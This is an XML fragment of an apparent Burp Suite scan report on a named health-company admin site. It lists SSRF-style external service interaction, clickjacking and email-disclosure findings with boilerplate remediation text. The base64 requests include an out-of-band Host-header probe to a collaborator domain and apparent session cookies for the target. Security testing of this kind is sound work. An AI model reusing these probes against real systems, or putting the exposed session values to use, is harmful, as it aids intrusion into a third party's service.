    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li><li><a href="https://capec.mitre.org/data/definitions/63.html">CAPEC-63: Cross-Site Scripting (XSS)</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9mb250cy9mb250YXdlc29tZS13ZWJmb250LndvZmYyP3Y9NC43LjAgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQ29va2llOiBQSFBTRVNTSUQ9a2FqNjEwbTBycGdxcTRhaWNzdW1hZ29mNHM7IHNjcmVlbldpZHRoPTEzNjg7IEFXU0FMQj03eVlFUXNpbVhVQ2dmd09NaDdKT1ptT2RCZ3dDcWRPdm1KYnRGWXBPaW5samI5b2hVV2tWUDk4VnJMRlZmV0prZHNIYXBWMHRqQXloLytNZU1MeFNqbzhtVzBqNkJPaENhT0tyREkzWVkyTGFuNkNaZlNsUTNMWDc2a0RvOyBBV1NBTEJDT1JTPTd5WUVRc2ltWFVDZ2Z3T01oN0pPWm1PZEJnd0NxZE92bUpidEZZcE9pbmxqYjlvaFVXa1ZQOThWckxGVmZXSmtkc0hhcFYwdGpBeWgvK01lTUx4U2pvOG1XMGo2Qk9oQ2FPS3JESTNZWTJMYW42Q1pmU2xRM0xYNzZrRG8NCk9yaWdpbjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KU2VjLUNoLVVhLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC45DQpTZWMtQ2gtVWE6ICJDaHJvbWl1bSI7dj0iMTMxIiwgIk5vdF9BIEJyYW5kIjt2PSIyNCINClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNClNlYy1DaC1VYS1Nb2JpbGU6ID8wDQpBY2NlcHQ6ICovKg0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtTW9kZTogY29ycw0KU2VjLUZldGNoLURlc3Q6IGZvbnQNClJlZmVyZXI6IGh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpQcmlvcml0eTogdT0wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2339023409421736960</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/fonts/fontawesome-webfont.woff2]]></path>
    <location><![CDATA[/fonts/fontawesome-webfont.woff2]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>w74bdxyctt07lru4qbm4b3b62x8rwnxbqae01qpf.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHc3NGJkeHljdHQwN2xydTRxYm00YjNiNjJ4OHJ3bnhicWFlMDFxcGYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:49:32.214 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>w74bdxyctt07lru4qbm4b3b62x8rwnxbqae01qpf.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>844770548568015872</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/fonts/fontawesome-webfont.woff2]]></path>
    <location><![CDATA[/fonts/fontawesome-webfont.woff2]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>w74bdxyctt07lru4qbm4b3b62x8rwnxbqae01qpf.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHc3NGJkeHljdHQwN2xydTRxYm00YjNiNjJ4OHJ3bnhicWFlMDFxcGYub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:49:33.154 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHc3NGJkeHljdHQwN2xydTRxYm00YjNiNjJ4OHJ3bnhicWFlMDFxcGYub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1nb3RnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7986047403032700928</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/forgotPassword]]></path>
    <location><![CDATA[/forgotPassword]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/web-security/clickjacking">Web Security Academy: Clickjacking</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li><li><a href="https://cwe.mitre.org/data/definitions/1021.html">CWE-1021: Improper Restriction of Rendered UI Layers or Frames</a></li><li><a href="https://capec.mitre.org/data/definitions/103.html">CAPEC-103: Clickjacking</a></li></ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9mb3Jnb3RQYXNzd29yZCBIVFRQLzINCkhvc3Q6IGFkbWluLm1pcmFkb3JoZWFsdGguY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNw0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUztxPTAuOSxlbjtxPTAuOA0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjY3NzguODYgU2FmYXJpLzUzNy4zNg0KQ29ubmVjdGlvbjogY2xvc2UNCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KQ29va2llOiBQSFBTRVNTSUQ9Ymh1ZG1zMG9hYnJtOTI3NDlyOGZhNzBrYmw7IEFXU0FMQj10ZWoramFhVHFQZE9uWlV5dm5BZXZnejR3Wm11clhobFBSRG0rM2lKRVk4cmxNMzAreU4zZUNLTlpyRnJJU1VLQ1N5dk1ia0Q2bjcyMEFKYkRndTladmd6TzIzY3ZFalh4V2JBcDJwRzRQR2hKZ2NWbFMwbng4T01JRG4xOyBBV1NBTEJDT1JTPXRlaitqYWFUcVBkT25aVXl2bkFldmd6NHdabXVyWGhsUFJEbSszaUpFWThybE0zMCt5TjNlQ0tOWnJGcklTVUtDU3l2TWJrRDZuNzIwQUpiRGd1OVp2Z3pPMjNjdkVqWHhXYkFwMnBHNFBHaEpnY1ZsUzBueDhPTUlEbjE7IHNjcmVlbldpZHRoPTgwMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9sb2dpbg0KU2VjLUNILVVBOiAiLk5vdC9BKUJyYW5kIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSIxMzEiLCAiQ2hyb21pdW0iO3Y9IjEzMSINClNlYy1DSC1VQS1QbGF0Zm9ybTogV2luZG93cw0KU2VjLUNILVVBLU1vYmlsZTogPzANCg0K]]></request>
      <response base64="true"><![CDATA[SFRUUC8yIDIwMCBPSw0KRGF0ZTogU2F0LCAxNCBEZWMgMjAyNCAyMzo0Mjo1MCBHTVQNCkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQpDb250ZW50LUxlbmd0aDogNDQxNA0KU2V0LUNvb2tpZTogQVdTQUxCPUxxVit1MG1JdFNXR1BKMTVzN2pnamNETzhQQTQxcU5SeE9oeTI1T3pnUkpZYW8rUWxJcmtiazVHZjQwU3RrRUhQenpYd3FtQVZmSk5xSm13Y2pmQjJKODZlU3UvRnNhbXg3dGpEOGZEVVBhZGZyNVlKSFFIZGtadlI5RWk7IEV4cGlyZXM9U2F0LCAyMSBEZWMgMjAyNCAyMzo0Mjo1MCBHTVQ7IFBhdGg9Lw0KU2V0LUNvb2tpZTogQVdTQUxCQ09SUz1McVYrdTBtSXRTV0dQSjE1czdqZ2pjRE84UEE0MXFOUnhPaHkyNU96Z1JKWWFvK1FsSXJrYms1R2Y0MFN0a0VIUHp6WHdxbUFWZkpOcUptd2NqZkIySjg2ZVN1L0ZzYW14N3RqRDhmRFVQYWRmcjVZSkhRSGRrWnZSOUVpOyBFeHBpcmVzPVNhdCwgMjEgRGVjIDIwMjQgMjM6NDI6NTAgR01UOyBQYXRoPS87IFNhbWVTaXRlPU5vbmU7IFNlY3VyZQ0KU2VydmVyOiBBcGFjaGUvMi40LjUyICgpIFBIUC84LjIuOQ0KWC1Qb3dlcmVkLUJ5OiBQSFAvOC4yLjkNCkV4cGlyZXM6IFRodSwgMTkgTm92IDE5ODEgMDg6NTI6MDAgR01UDQpDYWNoZS1Db250cm9sOiBuby1zdG9yZSwgbm8tY2FjaGUsIG11c3QtcmV2YWxpZGF0ZQ0KUHJhZ21hOiBuby1jYWNoZQ0KDQo8aHRtbD4KICAgICAgICA8aGVhZD4KICAgICAgICA8dGl0bGU+TWlyYWRvciBJbnNpZ2h0czwvdGl0bGU+CiAgICAgICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogICAgICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJNaXJhZG9yIEhlYWx0aCI+CiAgICAgICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIiAvPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvaWNvIiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9mYXZpY29uLmljbyIvPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL3NlbGVjdDIubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9kYXRlcmFuZ2VwaWNrZXIuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnRhd2Vzb21lLWZyZWUtYWxsLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvZGF0YVRhYmxlcy5ib290c3RyYXA0LmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9yZXNwb25zaXZlLmJvb3RzdHJhcDQuY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2J1dHRvbnMuYm9vdHN0cmFwNC5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvYWRtaW5sdGUubWluLmNzcyI+CiAgICAgICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2Nzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2ZvbnQtYXdlc29tZS5taW4uY3NzIj4KICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vY3NzL2Jvb3RzdHJhcC1kYXRlcGlja2VyLm1pbi5jc3MiPgogICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8c2NyaXB0PnZhciBhY3RpdmVUaGVtZSA9ICdsaWdodCc8L3NjcmlwdD4gICAgICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9hZG1pbi5taXJhZG9yaGVhbHRoLmNvbS9jc3MvbWFpbi1saWdodC5jc3M/dj1mNzJkNDIiPgoKICAgICAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vYWRtaW4ubWlyYWRvcmhlYWx0aC5jb20vZm9udHMvc3R5bGVzaGVldC5jc3MiPgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgICAgIGRvY3VtZW50LmNvb2tpZSA9ICJzY3JlZW5XaWR0aD0iK3NjcmVlbi53aWR0aCsiOzMwO3BhdGg9LyI7CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2hlYWQ+CiAgICA8Ym9keSBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICAgICAgPGRpdiBjbGFzcz0ibG9naW4tYm94Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImxvZ2luLWxvZ28iIHN0eWxlPSJtYXJnaW4tdG9wOiAwLjZyZW07Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBjbGFzcz0idy03NSIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2ltYWdlcy9taXJhZG9yX2luc2lnaHRzX2xvZ28ucG5nIiAvPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJsb2dpbi1ib3gtbXNnIj5Gb3Jnb3QgUGFzc3dvcmQ8L3A+CgogICAgICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgaWQ9ImZvcmdvdFBhc3N3b3JkIiBuYW1lPSJmb3Jnb3RQYXNzd29yZCIgY2xhc3M9Im1iLTAiIG9uc3VibWl0PSJyZXR1cm4gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIj4KICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gaWQ9ImVtYWlsRXJyIiBjbGFzcz0iaW52YWxpZC1mZWVkYmFjayBkLWJsb2NrIj48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImQtYmxvY2siPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgbWItMyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IG5hbWU9ImVtYWlsIiBpZD0iZW1haWwiIHR5cGU9ImVtYWlsIiBjbGFzcz0iZm9ybS1jb250cm9sIiBwbGFjZWhvbGRlcj0iRW1haWwiIHZhbHVlPSIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwLWFwcGVuZCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwLXRleHQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZhcyBmYS1lbnZlbG9wZSI+PC9zcGFuPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93IHJvdy1lcS1oZWlnaHQiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC04Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IGgtMTAwIGFsaWduLWl0ZW1zLWNlbnRlciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2xvZ2luIj5CYWNrIHRvIGxvZ2luPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtNCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9ImZvcmdvdFBhc3N3b3JkIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLWJsb2NrIj5TdWJtaXQ8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwczovL2FkbWluLm1pcmFkb3JoZWFsdGguY29tL2pzL3ZhbGlkYXRpb24uanMiPjwvc2NyaXB0PgogICAgICAgIDxzY3JpcHQ+CiAgICAgICAgZnVuY3Rpb24gdmFsaWRhdGVGb3Jnb3RQYXNzd29yZCgpIHsKICAgICAgICAgICAgdmFyIGVtYWlsRXJyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImVtYWlsRXJyIik7CiAgICAgICAgICAgIHZhciBlbWFpbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJlbWFpbCIpLnZhbHVlLnRyaW0oKTsKICAgICAgICAgICAgZW1haWxFcnIuaW5uZXJIVE1MID0gJyc7CgogICAgICAgICAgICBpZiAoIXZhbGlkYXRlRW1haWwoZW1haWwpKSB7CiAgICAgICAgICAgICAgICBlbWFpbEVyci5pbm5lckhUTUwgPSAnUGxlYXNlIGVudGVyIHZhbGlkIGVtYWlsIGFkZHJlc3MuJzsKICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CiAgICAgICAgPC9zY3JpcHQ+CiAgICA8L2JvZHk+CjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2314838548913765376</serialNumber>
    <type>6291968</type>
    <name><![CDATA[Email addresses disclosed]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/forgotPassword]]></path>
    <location><![CDATA[/forgotPassword]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The presence of email addresses within application responses does not necessarily constitute a security vulnerability. Email addresses may appear intentionally within contact information, and many applications (such as web mail) include arbitrary third-party email addresses within their core content.</p>
<p>However, email addresses of developers and other individuals (whether appearing on-screen or hidden within page source) may disclose information that is useful to an attacker; for example, they may represent usernames that can be used at the application's login, and they may be used in social engineering attacks against the organization's personnel. Unnecessary or excessive disclosure of email addresses may also lead to an increase in the volume of spam email received.</p>]]></issueBackground>
